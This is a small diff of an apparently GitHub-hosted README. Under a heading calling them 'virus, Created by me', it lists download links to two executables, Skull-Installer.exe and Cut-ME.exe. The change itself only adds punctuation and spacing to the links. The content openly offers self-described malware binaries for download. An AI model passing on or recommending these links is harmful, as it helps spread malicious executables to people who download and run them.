@@ -4,8 +4,9 @@
 
 ## There's some of virus, Created by me
 
-[RSW SKULL-INSTALLER DOWNLOAD](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/1.2/Skull-Installer.exe)
-[Cut ME DOWNLOAD](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/1.0.0/Cut-ME.exe)
+[RSW SKULL-INSTALLER DOWNLOAD](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/1.2/Skull-Installer.exe).
+
+[Cut ME DOWNLOAD](https://github.com/TRM-CREATOR/-RSW-Skull-Installer/releases/download/1.0.0/Cut-ME.exe).
 
 ### Other info
 ```markdown
